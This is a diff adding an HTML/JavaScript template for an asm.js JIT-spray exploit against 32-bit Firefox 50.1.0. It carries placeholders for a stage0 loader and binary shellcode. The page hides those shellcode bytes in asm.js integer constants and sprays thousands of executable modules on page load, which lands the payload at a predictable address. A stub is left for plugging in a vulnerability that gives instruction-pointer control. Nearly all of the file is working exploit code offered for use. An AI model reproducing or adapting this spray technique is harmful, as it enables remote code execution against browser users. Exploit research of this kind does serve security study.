@@ -1,0 +1,122 @@
+<!DOCTYPE HTML>
+
+<!--
+
+    ASM.JS JIT SPRAY
+
+    works on 32-bit Firefox - successfully tested with 50.1.0
+
+    DYNAMIC LOADER - generated via:
+    %CMDLINE%
+
+    (C) Rh0
+
+-->
+
+<head>
+<meta charset=UTF-8 />
+<script>
+
+#IF BIN_PAYLOAD#
+// stage0 will load and execute payload
+payload = %BIN_PAYLOAD%
+max_payload_sz = %MAX_PAYLOAD_SIZE%
+#ENDIF BIN_PAYLOAD#
+stage0 = %STAGE0%
+asm_js_header = '' +
+'function asm_js_module(){' + 
+'        "use asm";' +
+'        function payload_code(){' + 
+'            var val = 0;'
+
+asm_js_footer = '' +
+'            return val|0;' +
+'    }' +
+'    return payload_code;' +
+'};' +
+/* triggers creation of many RX modules */
+'spray_modules();'
+
+nops = 'val = (val + 0xa8909090)|0;'
+
+
+function load_asmjs(){
+    code = ""
+
+    /* nops */
+    for (var i = 0; i <= 40; i++){
+        code += nops
+    }
+
+    /* stage0 or custom payload */
+    for (i in stage0){
+        //code += 'val = (val + 0xa8' +
+        //   (stage0[i] + 0x1000000).toString(16).slice(1) + ')|0;'
+        /* for a stage0 array with string elements consisting of 3 hex bytes*/
+        code += 'val = (val + 0xa8' + stage0[i] + ')|0;'
+    }
+#IF BIN_PAYLOAD#
+    if (payload.length > max_payload_sz){
+        alert("Error: shellcode payload is too big")
+        return
+    }
+
+    /* append binary payload (if any, in case stage0 loader is used) */
+    for (var i=0; i < payload.length; i+=3){
+        code += 'val = (val + 0xa8';
+        val = payload.slice(i, i + 3)
+        /* only for last iteration */
+        while (val.length < 3) val += "\x90"
+        for (var j=2; j>=0; j--){
+            code += (0x100 + val.charCodeAt(j)).toString(16).slice(1)
+        }
+        code += ')|0;'
+    }
+
+    /* fill up payload space */
+    if (payload.length > 0){
+        for (var i=0; i < (max_payload_sz - payload.length); i+=3){
+            code += nops 
+        }
+    }
+#ENDIF BIN_PAYLOAD#
+    /* https://developer.mozilla.org/en-US/docs/Games/Techniques/Async_scripts
+     */
+    asm_js = asm_js_header + code + asm_js_footer
+    /* create blob script and load it */
+    var blob = new Blob([asm_js]);
+    var script = document.createElement('script');
+    var url = URL.createObjectURL(blob);
+    script.onload = script.onerror = function() { URL.revokeObjectURL(url); };
+    script.src = url;
+    /* triggers asm module compilation and spray_modules() execution */
+    document.body.appendChild(script);
+}
+
+
+function spray_modules(){
+    sprayed = []
+    for (var i=0; i<= 0x1800; i++){
+        sprayed[i] = asm_js_module()
+    }
+
+    trigger_vuln()
+}
+
+/* GET EIP CONTROL WITH YOUR VULN HERE */
+/* SET EIP TO 0x1C1C0053 ON WINDOWS 32-bit*/
+function trigger_vuln(){
+    /* You may need to adjust this address dependent on your vuln and version */
+    alert("Set EIP to 0x1c1c0053 (32-bit Firefox 50.1.0 on Windows) with your vuln here")
+}
+
+
+</script>
+</head>
+<html>
+<body style=background:black onload=load_asmjs()>
+<h1 style=color:green>
+%HEADER%
+</h1>
+</body>
+</html>
